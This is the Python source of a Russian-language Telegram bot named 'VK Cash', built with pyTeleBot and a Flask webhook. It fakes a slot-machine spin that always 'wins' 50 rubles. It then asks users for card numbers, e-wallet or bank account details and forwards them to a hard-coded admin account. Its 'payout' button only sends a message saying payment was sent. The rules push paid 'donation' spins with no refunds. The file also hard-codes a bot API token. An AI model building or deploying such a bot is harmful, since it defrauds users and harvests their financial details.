
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import re
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
user_states = {}
first_spin_done = {}

CODES_FILE = "codes.json"
if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

@bot.message_handler(commands=['start'])
def send_start(message):
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🎁 Крутить бесплатно", callback_data="free_spin"),
        InlineKeyboardButton("📜 Правила", callback_data="rules"),
        InlineKeyboardButton("❓ FAQ", callback_data="faq"),
        InlineKeyboardButton("📋 Политика", callback_data="policy")
    )
    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!
Выбирай действие ниже:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid):
        bot.answer_callback_query(call.id, "Бесплатная попытка уже использована.")
        return

    first_spin_done[uid] = True
    amount = 50  # фиксированный первый выигрыш

    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...
[ 🎰 🎰 🎰 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍉 💰 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")
    time.sleep(1)

    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    bot.send_message(call.message.chat.id, f"🎉 *ПОБЕДА {amount}₽!* 🎉
🎫 Код: `{code}`

💳 Отправьте свои реквизиты:
— Номер карты (Сбербанк, Тинькофф)
— Или кошелёк (ЮMoney, Payeer, PayPal)
— Или банк + номер счёта", parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    uid = message.from_user.id
    if uid in user_states:
        state = user_states.pop(uid)
        payout_info = f"💰 Новая заявка:
👤 @{message.from_user.username or message.from_user.first_name}
🆔 {uid}
📦 Сумма: {state['amount']}₽
🔐 Код: {state['code']}
💳 Реквизиты: {message.text}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💸 Выплатить", callback_data=f"pay_{uid}"))
        bot.send_message(ADMIN_ID, payout_info, reply_markup=markup)
        bot.reply_to(message, "✅ Заявка отправлена! Ожидай выплату.")
    else:
        bot.send_message(message.chat.id, "❌ Сначала крути колесо и получи код!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def handle_payment(call):
    user_id = call.data.split("_")[1]
    bot.send_message(user_id, "💸 Выплата отправлена! Спасибо за участие 🙌")
    bot.answer_callback_query(call.id, "Выплата отмечена!")

@bot.callback_query_handler(func=lambda call: call.data in ["rules", "faq", "policy"])
def handle_info(call):
    info = {
        "rules": "📜 *Правила участия:*
- Первая прокрутка — бесплатная
- Повторная — вручную после доната
- Суммы бонусов — от 50₽ до 500₽
- После оплаты — случайный результат",
        "faq": "❓ *FAQ:*
- *Как сыграть?* Нажми 'Крутить'
- *Как снова сыграть?* Пока вручную, жди обновлений
- *Как получить бонус?* Забери код и отправь реквизиты",
        "policy": "📋 *Политика:*
- Проект — развлекательный
- Результаты случайны
- Возврата нет
- Участие добровольное"
    }
    bot.send_message(call.message.chat.id, info[call.data], parse_mode="Markdown")

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bot is running!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
